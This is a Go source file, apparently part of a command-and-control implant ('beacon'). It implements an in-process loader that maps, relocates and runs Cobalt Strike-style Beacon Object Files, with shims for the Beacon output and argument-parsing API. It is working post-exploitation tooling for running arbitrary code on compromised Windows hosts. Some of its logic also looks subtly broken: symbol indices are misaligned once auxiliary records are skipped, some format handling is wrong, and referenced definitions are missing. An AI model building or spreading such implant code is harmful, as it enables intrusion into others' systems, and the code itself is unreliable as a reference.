//go:build windows && amd64

package main

import (
	"encoding/binary"
	"fmt"
	"strings"
	"syscall"
	"unsafe"
)

// In-process COFF loader for amd64 BOFs.
//
// Scope and limits, stated up front:
//
//   - Sections are laid out in one VirtualAlloc region, relocated, then given
//     per-section protections (RX for code, R for read-only data, RW otherwise).
//   - Imports resolve against the Beacon API subset implemented below and, for
//     everything else, against kernel32/ntdll/user32/advapi32/ws2_32/ole32/shell32
//     exports by name.
//   - The object entry point is `go` (Cobalt Strike convention), then `_go`,
//     `bof_main`, `main`.
//   - A BOF that faults inside the beacon process takes the beacon with it. That
//     is inherent to in-process execution; there is no sandbox here.
//
// Unsupported API surface (implemented as failing stubs so objects that merely
// reference them still load): the BeaconFormat* family, token APIs, toWideChar.

const (
	coffSectionHeaderSize = 40
	coffSymbolSize        = 18

	imageRelAMD64Absolute = 0x0000
	imageRelAMD64Addr64   = 0x0001
	imageRelAMD64Addr32   = 0x0002
	imageRelAMD64Addr32NB = 0x0003
	imageRelAMD64Rel32    = 0x0004
	imageRelAMD64Rel32_1  = 0x0005
	imageRelAMD64Rel32_2  = 0x0006
	imageRelAMD64Rel32_3  = 0x0007
	imageRelAMD64Rel32_4  = 0x0008
	imageRelAMD64Rel32_5  = 0x0009
	imageRelAMD64Section  = 0x000A
	imageRelAMD64SecRel   = 0x000B

	scnMemExecute   = 0x20000000
	scnMemRead      = 0x40000000
	scnMemWrite     = 0x80000000
	scnCntUninit    = 0x00000080
	scnMemDiscard   = 0x02000000
	storageExternal = 2

	memCommit            = 0x1000
	memReserve           = 0x2000
	pageNoAccess         = 0x01
	pageReadOnly         = 0x02
	pageReadWrite        = 0x04
	pageExecuteRead      = 0x20
	pageExecuteReadWrite = 0x40
)

// bofOutput receives what the object prints.
type bofOutput struct {
	buf strings.Builder
}

func (o *bofOutput) write(s string) {
	// Keep the result bounded: a runaway BOF must not fill the task result path.
	const limit = 256 * 1024
	if o.buf.Len() >= limit {
		return
	}
	if remaining := limit - o.buf.Len(); len(s) > remaining {
		s = s[:remaining]
	}
	o.buf.WriteString(s)
}

// bofCallbacks is the per-execution state the Beacon API shims read. The loader
// is single-threaded per call, so a package-level pointer is sufficient and keeps
// the shim signatures simple.
var bofState struct {
	output *bofOutput
	data   []byte
	offset uint32
}

type coffSection struct {
	name            string
	virtualSize     uint32
	rawSize         uint32
	rawPtr          uint32
	relocPtr        uint32
	relocCount      uint16
	characteristics uint32
	base            uintptr
}

type coffSymbol struct {
	name    string
	value   uint32
	section int16
	aux     uint8
	storage uint8
}

// executeBOF loads the object, runs its entry point and returns its output.
func executeBOF(request bofRequest) (output string, err error) {
	out := &bofOutput{}
	bofState.output = out
	bofState.data = nil
	bofState.offset = 0
	defer func() {
		bofState.output = nil
		bofState.data = nil
		if r := recover(); r != nil {
			err = fmt.Errorf("loader panic: %v", r)
			output = out.buf.String()
		}
	}()

	entry, err := loadAndRunCOFF(request.Object, request.ArgsCB)
	if err != nil {
		return out.buf.String(), err
	}
	_ = entry
	return out.buf.String(), nil
}

func loadAndRunCOFF(object []byte, args []byte) (int32, error) {
	if len(object) < 20+coffSectionHeaderSize {
		return 0, fmt.Errorf("object is too small to contain a section")
	}

	machine := binary.LittleEndian.Uint16(object[0:2])
	if machine != coffMachineAMD64 {
		return 0, fmt.Errorf("unsupported COFF machine 0x%04x", machine)
	}
	numSections := int(binary.LittleEndian.Uint16(object[2:4]))
	symTablePtr := binary.LittleEndian.Uint32(object[8:12])
	numSymbols := binary.LittleEndian.Uint32(object[12:16])
	optHeaderSize := int(binary.LittleEndian.Uint16(object[16:18]))

	if numSections <= 0 {
		return 0, fmt.Errorf("object declares no sections")
	}

	sections, err := parseSections(object, numSections, 20+optHeaderSize)
	if err != nil {
		return 0, err
	}

	symbols, stringTable, err := parseSymbols(object, symTablePtr, numSymbols)
	if err != nil {
		return 0, err
	}
	_ = stringTable

	// Lay the sections out in one region, 16-byte aligned, skipping discardable
	// metadata sections (debug info, .drectve and friends).
	var total uintptr
	order := make([]int, 0, len(sections))
	for i := range sections {
		section := &sections[i]
		if section.characteristics&scnMemDiscard != 0 {
			continue
		}
		size := section.virtualSize
		if size == 0 {
			size = section.rawSize
		}
		if size == 0 {
			continue
		}
		total = align16(total)
		section.base = total
		total += align16(uintptr(size))
		order = append(order, i)
	}
	if total == 0 {
		return 0, fmt.Errorf("object has no loadable section content")
	}

	region, err := virtualAlloc(total)
	if err != nil {
		return 0, err
	}
	// The allocation is the only address that is not an offset. Everything else
	// is derived with unsafe.Add from this pointer, so no arithmetic is converted
	// back into a pointer.
	mem := unsafe.Pointer(region)

	// Copy section content, then rebase the recorded offsets onto the region.
	for _, i := range order {
		section := &sections[i]
		dest := unsafe.Slice((*byte)(unsafe.Add(mem, section.base)), int(align16(uintptr(maxUint32(section.virtualSize, section.rawSize)))))
		if section.rawSize > 0 {
			if int(section.rawPtr)+int(section.rawSize) > len(object) {
				return 0, fmt.Errorf("section %s raw data runs past the object", section.name)
			}
			copy(dest, object[section.rawPtr:section.rawPtr+section.rawSize])
		}
	}

	// Resolve the entry point before relocations, so a missing entry fails fast.
	entryAddr, err := resolveEntry(&sections, symbols, region)
	if err != nil {
		return 0, err
	}

	if err := applyRelocations(object, &sections, symbols, region, mem); err != nil {
		return 0, err
	}

	// Per-section protections, once the bytes are final.
	for _, i := range order {
		section := &sections[i]
		size := align16(uintptr(maxUint32(section.virtualSize, section.rawSize)))
		prot := uintptr(pageReadWrite)
		switch {
		case section.characteristics&scnMemExecute != 0:
			prot = pageExecuteRead
		case section.characteristics&scnMemRead != 0 && section.characteristics&scnMemWrite == 0:
			prot = pageReadOnly
		}
		if err := virtualProtect(region+section.base, size, prot); err != nil {
			return 0, err
		}
	}

	entry := *(*func(*byte, int32) int32)(unsafe.Add(mem, entryAddr-region))
	var argsPtr *byte
	if len(args) > 0 {
		argsPtr = &args[0]
	}
	return entry(argsPtr, int32(len(args))), nil
}

func parseSections(object []byte, count, offset int) ([]coffSection, error) {
	if offset+count*coffSectionHeaderSize > len(object) {
		return nil, fmt.Errorf("section table runs past the object")
	}
	sections := make([]coffSection, count)
	for i := 0; i < count; i++ {
		raw := object[offset+i*coffSectionHeaderSize : offset+(i+1)*coffSectionHeaderSize]
		name := strings.TrimRight(string(raw[0:8]), "\x00")
		// Long names ("/4") live in the string table; the ones we care about
		// (.text, .data, .rdata, .bss) are always short.
		sections[i] = coffSection{
			name:            name,
			virtualSize:     binary.LittleEndian.Uint32(raw[8:12]),
			rawSize:         binary.LittleEndian.Uint32(raw[16:20]),
			rawPtr:          binary.LittleEndian.Uint32(raw[20:24]),
			relocPtr:        binary.LittleEndian.Uint32(raw[24:28]),
			relocCount:      binary.LittleEndian.Uint16(raw[32:34]),
			characteristics: binary.LittleEndian.Uint32(raw[36:40]),
		}
	}
	return sections, nil
}

func parseSymbols(object []byte, tablePtr, count uint32) ([]coffSymbol, []byte, error) {
	if tablePtr == 0 || count == 0 {
		return nil, nil, nil
	}
	end := uintptr(tablePtr) + uintptr(count)*coffSymbolSize
	if end > uintptr(len(object)) {
		return nil, nil, fmt.Errorf("symbol table runs past the object")
	}

	var stringTable []byte
	stringTableOffset := end
	if stringTableOffset+4 <= uintptr(len(object)) {
		size := binary.LittleEndian.Uint32(object[stringTableOffset : stringTableOffset+4])
		if size >= 4 && stringTableOffset+uintptr(size) <= uintptr(len(object)) {
			stringTable = object[stringTableOffset : stringTableOffset+uintptr(size)]
		}
	}

	symbols := make([]coffSymbol, 0, count)
	for i := uint32(0); i < count; i++ {
		raw := object[tablePtr+i*coffSymbolSize : tablePtr+(i+1)*coffSymbolSize]
		var name string
		if binary.LittleEndian.Uint32(raw[0:4]) == 0 {
			// Offset into the string table, past its own 4-byte length field.
			nameOffset := binary.LittleEndian.Uint32(raw[4:8])
			if int(nameOffset) < len(stringTable) {
				name = cString(stringTable[nameOffset:])
			}
		} else {
			name = cStringFixed(raw[0:8])
		}

		symbols = append(symbols, coffSymbol{
			name:    name,
			value:   binary.LittleEndian.Uint32(raw[8:12]),
			section: int16(binary.LittleEndian.Uint16(raw[12:14])),
			storage: raw[16],
			aux:     raw[17],
		})
		// Auxiliary records are not symbols; skip them so indices stay aligned.
		i += uint32(raw[17])
	}
	return symbols, stringTable, nil
}

func applyRelocations(object []byte, sections *[]coffSection, symbols []coffSymbol, region uintptr, mem unsafe.Pointer) error {
	for i := range *sections {
		section := &(*sections)[i]
		if section.relocCount == 0 || section.relocPtr == 0 || section.base == 0 {
			continue
		}
		if int(section.relocPtr)+int(section.relocCount)*10 > len(object) {
			return fmt.Errorf("relocations for %s run past the object", section.name)
		}
		for r := 0; r < int(section.relocCount); r++ {
			raw := object[section.relocPtr+uint32(r)*10 : section.relocPtr+uint32(r+1)*10]
			virtualAddr := binary.LittleEndian.Uint32(raw[0:4])
			symbolIndex := binary.LittleEndian.Uint32(raw[4:8])
			relocType := binary.LittleEndian.Uint16(raw[8:10])

			if int(symbolIndex) >= len(symbols) {
				return fmt.Errorf("relocation references symbol %d, which does not exist", symbolIndex)
			}
			target := unsafe.Add(mem, section.base+uintptr(virtualAddr))
			symbolAddr, err := resolveSymbol(&symbols[symbolIndex], sections, region)
			if err != nil {
				return err
			}

			switch relocType {
			case imageRelAMD64Absolute:
				// no-op
			case imageRelAMD64Addr64:
				*(*uint64)(target) += uint64(symbolAddr)
			case imageRelAMD64Addr32:
				*(*uint32)(target) += uint32(symbolAddr)
			case imageRelAMD64Addr32NB:
				*(*uint32)(target) += uint32(symbolAddr - region)
			case imageRelAMD64Rel32, imageRelAMD64Rel32_1, imageRelAMD64Rel32_2,
				imageRelAMD64Rel32_3, imageRelAMD64Rel32_4, imageRelAMD64Rel32_5:
				extra := uintptr(relocType - imageRelAMD64Rel32)
				next := region + section.base + uintptr(virtualAddr) + 4 + extra
				*(*uint32)(target) += uint32(int32(symbolAddr) - int32(next))
			case imageRelAMD64Section:
				*(*uint16)(target) += uint16(sectionNumber(&symbols[symbolIndex]))
			case imageRelAMD64SecRel:
				*(*uint32)(target) += symbols[symbolIndex].value
			default:
				return fmt.Errorf("unsupported relocation type 0x%04x in %s", relocType, section.name)
			}
		}
	}
	return nil
}

func resolveEntry(sections *[]coffSection, symbols []coffSymbol, region uintptr) (uintptr, error) {
	candidates := []string{"go", "_go", "bof_main", "main"}
	for _, candidate := range candidates {
		for i := range symbols {
			if symbols[i].name == candidate && symbols[i].section > 0 {
				return resolveSymbol(&symbols[i], sections, region)
			}
		}
	}
	return 0, fmt.Errorf("object has no entry point (looked for go/_go/bof_main/main)")
}

func resolveSymbol(symbol *coffSymbol, sections *[]coffSection, region uintptr) (uintptr, error) {
	if symbol.section > 0 {
		index := int(symbol.section) - 1
		if index >= len(*sections) {
			return 0, fmt.Errorf("symbol %s points at section %d, which does not exist", symbol.name, symbol.section)
		}
		return region + (*sections)[index].base + uintptr(symbol.value), nil
	}
	if symbol.section < 0 {
		return 0, fmt.Errorf("symbol %s is absolute/undefined in an unsupported way", symbol.name)
	}

	name := strings.TrimPrefix(symbol.name, "__imp_")
	name = strings.TrimPrefix(name, "_")
	if addr := resolveBOFApi(name); addr != 0 {
		return addr, nil
	}
	if addr, ok := resolveSystemExport(name); ok {
		return addr, nil
	}
	return 0, fmt.Errorf("unresolved import %q", symbol.name)
}

func sectionNumber(symbol *coffSymbol) int16 {
	if symbol.section > 0 {
		return symbol.section
	}
	return 0
}

// -----------------------------------------------------------------------------
// Beacon API surface
// -----------------------------------------------------------------------------

func resolveBOFApi(name string) uintptr {
	switch name {
	case "BeaconOutput":
		return syscall.NewCallback(bofBeaconOutput)
	case "BeaconPrintf":
		return syscall.NewCallback(bofBeaconPrintf)
	case "BeaconDataParse":
		return syscall.NewCallback(bofBeaconDataParse)
	case "BeaconDataInt":
		return syscall.NewCallback(bofBeaconDataInt)
	case "BeaconDataShort":
		return syscall.NewCallback(bofBeaconDataShort)
	case "BeaconDataLength":
		return syscall.NewCallback(bofBeaconDataLength)
	case "BeaconDataExtract":
		return syscall.NewCallback(bofBeaconDataExtract)
	case "BeaconDataPtr":
		return syscall.NewCallback(bofBeaconDataPtr)
	case "BeaconIsAdmin":
		return syscall.NewCallback(func() uintptr { return 0 })
	case "BeaconFormatAlloc", "BeaconFormatReset", "BeaconFormatFree",
		"BeaconFormatAppend", "BeaconFormatPrintf", "BeaconFormatToString",
		"BeaconUseToken", "BeaconRevertToken", "BeaconGetSpawnTo",
		"toWideChar":
		// Referenced by objects that we can still load; they simply do nothing
		// useful. Returning 0 is the documented failure value for the ones that
		// return a handle or a length.
		return syscall.NewCallback(func() uintptr { return 0 })
	}
	return 0
}

func bofBeaconOutput(typ uintptr, data uintptr, length uintptr) uintptr {
	if bofState.output == nil || data == 0 || length == 0 {
		return 0
	}
	bofState.output.write(string(unsafe.Slice((*byte)(unsafe.Pointer(data)), int(length))))
	return 0
}

// bofBeaconPrintf takes a fixed number of varargs slots; the formatter consumes
// only as many as the format string asks for, so unread slots never get touched.
func bofBeaconPrintf(typ uintptr, format uintptr, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 uintptr) uintptr {
	if bofState.output == nil || format == 0 {
		return 0
	}
	args := []uintptr{a1, a2, a3, a4, a5, a6, a7, a8, a9, a10}
	bofState.output.write(formatC(cStringPtr(format), args))
	return 0
}

func bofBeaconDataParse(parser uintptr, buffer uintptr, length uintptr) uintptr {
	// The parser struct is {char *buffer; int length; int offset;} in the object's
	// memory; fill it in place.
	if parser == 0 {
		return 0
	}
	*(*uintptr)(unsafe.Pointer(parser)) = buffer
	*(*uint32)(unsafe.Pointer(parser + 8)) = uint32(length)
	*(*uint32)(unsafe.Pointer(parser + 12)) = 0
	if buffer != 0 && length != 0 {
		bofState.data = unsafe.Slice((*byte)(unsafe.Pointer(buffer)), int(length))
	}
	bofState.offset = 0
	return 0
}

func bofBeaconDataLength(parser uintptr) uintptr {
	if parser == 0 {
		return 0
	}
	return uintptr(*(*uint32)(unsafe.Pointer(parser + 8)))
}

func bofBeaconDataExtract(parser uintptr, sizePtr uintptr) uintptr {
	if parser == 0 || len(bofState.data) == 0 {
		return 0
	}
	offset := int(*(*uint32)(unsafe.Pointer(parser + 12)))
	if offset >= len(bofState.data) {
		return 0
	}
	// Each field is a 4-byte length followed by that many bytes.
	remaining := bofState.data[offset:]
	if len(remaining) < 4 {
		return 0
	}
	length := int(binary.LittleEndian.Uint32(remaining[0:4]))
	if 4+length > len(remaining) {
		return 0
	}
	dataStart := offset + 4
	*(*uint32)(unsafe.Pointer(parser + 12)) = uint32(dataStart + length)
	if sizePtr != 0 {
		*(*uint32)(unsafe.Pointer(sizePtr)) = uint32(length)
	}
	return uintptr(unsafe.Pointer(&bofState.data[dataStart]))
}

func bofBeaconDataPtr(parser uintptr, sizePtr uintptr) uintptr {
	return bofBeaconDataExtract(parser, sizePtr)
}

func bofBeaconDataInt(parser uintptr) uintptr {
	if parser == 0 || len(bofState.data) == 0 {
		return 0
	}
	offset := int(*(*uint32)(unsafe.Pointer(parser + 12)))
	if offset+4 > len(bofState.data) {
		return 0
	}
	value := binary.LittleEndian.Uint32(bofState.data[offset : offset+4])
	*(*uint32)(unsafe.Pointer(parser + 12)) = uint32(offset + 4)
	return uintptr(int32(value))
}

func bofBeaconDataShort(parser uintptr) uintptr {
	if parser == 0 || len(bofState.data) == 0 {
		return 0
	}
	offset := int(*(*uint32)(unsafe.Pointer(parser + 12)))
	if offset+2 > len(bofState.data) {
		return 0
	}
	value := binary.LittleEndian.Uint16(bofState.data[offset : offset+2])
	*(*uint32)(unsafe.Pointer(parser + 12)) = uint32(offset + 2)
	return uintptr(value)
}

// -----------------------------------------------------------------------------
// System exports and Win32 memory
// -----------------------------------------------------------------------------

var systemDLLs = []string{"kernel32.dll", "ntdll.dll", "user32.dll", "advapi32.dll", "ws2_32.dll", "ole32.dll", "shell32.dll"}

var systemExports = map[string]uintptr{}

func resolveSystemExport(name string) (uintptr, bool) {
	if addr, ok := systemExports[name]; ok {
		return addr, addr != 0
	}
	// Explicit "module!function" form takes precedence.
	if dll, function, ok := strings.Cut(name, "!"); ok {
		addr := procAddress(dll, function)
		systemExports[name] = addr
		return addr, addr != 0
	}
	for _, dll := range systemDLLs {
		if addr := procAddress(dll, name); addr != 0 {
			systemExports[name] = addr
			return addr, true
		}
	}
	systemExports[name] = 0
	return 0, false
}

func procAddress(dll, name string) uintptr {
	handle, err := syscall.LoadLibrary(dll)
	if err != nil {
		return 0
	}
	// Deliberately not FreeLibrary: the object may call the export again, and
	// keeping system DLLs loaded costs nothing.
	proc, err := syscall.GetProcAddress(handle, name)
	if err != nil {
		return 0
	}
	return proc
}

func virtualAlloc(size uintptr) (uintptr, error) {
	kernel32, err := syscall.LoadLibrary("kernel32.dll")
	if err != nil {
		return 0, fmt.Errorf("kernel32: %v", err)
	}
	proc, err := syscall.GetProcAddress(kernel32, "VirtualAlloc")
	if err != nil {
		return 0, fmt.Errorf("VirtualAlloc: %v", err)
	}
	addr, _, callErr := syscall.SyscallN(proc, 0, size, memCommit|memReserve, pageReadWrite)
	if addr == 0 {
		return 0, fmt.Errorf("VirtualAlloc(%d) failed: %v", size, callErr)
	}
	return addr, nil
}

func virtualProtect(addr, size, protect uintptr) error {
	kernel32, err := syscall.LoadLibrary("kernel32.dll")
	if err != nil {
		return err
	}
	proc, err := syscall.GetProcAddress(kernel32, "VirtualProtect")
	if err != nil {
		return err
	}
	var old uintptr
	ok, _, callErr := syscall.SyscallN(proc, addr, size, protect, uintptr(unsafe.Pointer(&old)))
	if ok == 0 {
		return fmt.Errorf("VirtualProtect(%#x) failed: %v", addr, callErr)
	}
	return nil
}

// -----------------------------------------------------------------------------
// Helpers
// -----------------------------------------------------------------------------

func align16(value uintptr) uintptr { return (value + 15) &^ 15 }

func maxUint32(a, b uint32) uint32 {
	if a > b {
		return a
	}
	return b
}

func cString(b []byte) string {
	if i := strings.IndexByte(string(b), 0); i >= 0 {
		return string(b[:i])
	}
	return string(b)
}

func cStringFixed(b []byte) string {
	end := len(b)
	for i, c := range b {
		if c == 0 {
			end = i
			break
		}
	}
	return string(b[:end])
}

func cStringPtr(ptr uintptr) string {
	if ptr == 0 {
		return ""
	}
	var out []byte
	for i := uintptr(0); i < 8192; i++ {
		c := *(*byte)(unsafe.Pointer(ptr + i))
		if c == 0 {
			break
		}
		out = append(out, c)
	}
	return string(out)
}

// formatC renders the printf subset BOFs use, consuming exactly as many varargs
// as the format string asks for.
func formatC(format string, args []uintptr) string {
	var out strings.Builder
	argIndex := 0
	nextArg := func() uintptr {
		if argIndex < len(args) {
			value := args[argIndex]
			argIndex++
			return value
		}
		return 0
	}

	for i := 0; i < len(format); i++ {
		if format[i] != '%' {
			out.WriteByte(format[i])
			continue
		}
		if i+1 < len(format) && format[i+1] == '%' {
			out.WriteByte('%')
			i++
			continue
		}

		// Skip flags, width and precision.
		j := i + 1
		for j < len(format) && strings.ContainsRune("-+ #0123456789.", rune(format[j])) {
			j++
		}
		if j >= len(format) {
			out.WriteString(format[i:])
			break
		}

		spec := format[j]
		switch spec {
		case 's':
			out.WriteString(cStringPtr(nextArg()))
		case 'd', 'i':
			out.WriteString(fmt.Sprintf("%d", int32(nextArg())))
		case 'u':
			out.WriteString(fmt.Sprintf("%d", uint32(nextArg())))
		case 'x':
			out.WriteString(fmt.Sprintf("%x", uint32(nextArg())))
		case 'X':
			out.WriteString(fmt.Sprintf("%X", uint32(nextArg())))
		case 'p':
			out.WriteString(fmt.Sprintf("%#x", nextArg()))
		case 'c':
			out.WriteByte(byte(nextArg()))
		case 'l', 'z':
			// Length modifiers: treat as the 64-bit variant of the next spec.
			if j+1 < len(format) {
				switch format[j+1] {
				case 'd', 'i':
					out.WriteString(fmt.Sprintf("%d", int64(nextArg())))
				case 'u', 'x', 'X':
					out.WriteString(fmt.Sprintf("%d", nextArg()))
				case 's':
					out.WriteString(cStringPtr(nextArg()))
				}
				j++
			}
		default:
			out.WriteByte('%')
			out.WriteByte(spec)
		}
		i = j
	}
	return out.String()
}
